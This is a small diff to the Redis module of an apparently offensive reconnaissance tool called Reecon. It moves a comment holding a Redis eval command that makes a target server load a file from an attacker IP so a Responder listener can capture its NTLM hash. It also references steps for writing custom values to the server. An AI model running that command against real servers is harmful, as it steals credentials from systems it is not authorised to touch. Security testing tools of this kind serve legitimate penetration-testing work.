@@ -8,7 +8,7 @@ using System.Text;
 
 namespace Reecon
 {
-    class Redis
+    class Redis // 6379
     {
         public static string GetInfo(string ip, int port)
         {
@@ -20,6 +20,8 @@ namespace Reecon
              * --> WRONGTYPE Operation against a key holding the wrong kind of value
              * 4.a) LRANGE "keyName" 0 500
              */
+
+            // eval "dofile('//10.8.26.200/test')" 0 - Get Responder hash
 
             bool canSetDB = false;
             bool canSetPath = false;
@@ -150,7 +152,6 @@ namespace Reecon
                             returnText += Environment.NewLine + "--- " + "6.) Browse to file location on server to see your custom value".Pastel(Color.Orange);
                         }
                     }
-                    // eval "dofile('//10.8.26.200/test')" 0 - Get Responder hash
 
                 }
                 catch (Exception ex)
